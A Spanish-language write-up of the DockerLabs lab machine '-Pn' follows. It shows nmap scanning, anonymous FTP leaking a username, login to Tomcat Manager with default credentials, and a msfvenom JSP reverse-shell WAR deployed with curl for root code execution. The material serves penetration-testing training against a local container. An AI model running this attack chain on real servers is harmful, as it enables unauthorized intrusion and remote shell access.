---
title: "DockerLabs - -Pn"
difficulty: "Fácil"
source: "DockerLabs"
---

Máquina orientada a la explotación del panel de administración de Apache Tomcat mediante credenciales por defecto, desplegando un payload WAR malicioso.

## Despliegue

```bash
bash auto_deploy.sh -Pn.tar
```

## Reconocimiento

```bash
nmap -sV -p- 172.17.0.2
```

Puertos detectados:
- **21/tcp** — FTP (vsftpd, anonymous habilitado)
- **8080/tcp** — HTTP (Apache Tomcat 9.0.88)

### FTP anónimo

```bash
ftp 172.17.0.2
# user: anonymous / pass: (vacío)
```

Dentro hay un fichero `tomcat.txt`:
> "Hello tomcat, can you configure the tomcat server? I lost the password..."

Confirma que el usuario de Tomcat es **`tomcat`**.

**Nota:** si la IP del contenedor es `.3`, Tomcat devuelve 403 (restricción por IP). Para obtener la `.2`:

```bash
docker rm -f $(docker ps -aq)
bash auto_deploy.sh -Pn.tar
```

## Explotación

### Credenciales por defecto

```bash
curl -o /dev/null -s -w "%{http_code}" -u tomcat:s3cret http://172.17.0.2:8080/manager/html
# 200
```

Credenciales válidas: `tomcat:s3cret`

### Reverse shell via WAR

```bash
# Generar payload
msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.17.0.1 LPORT=4444 -f war -o /tmp/shell.war

# Listener
nc -lvnp 4444

# Desplegar
curl -u tomcat:s3cret -T /tmp/shell.war "http://172.17.0.2:8080/manager/text/deploy?path=/shell&update=true"

# Activar
curl http://172.17.0.2:8080/shell/
```

## Post-explotación

```bash
whoami
# root
```

El proceso de Tomcat corre como root dentro del contenedor. No requiere escalada.

## Conclusión

FTP anónimo filtra el nombre de usuario → Tomcat Manager con credenciales por defecto (`tomcat:s3cret`) → WAR malicioso → RCE directo como root.
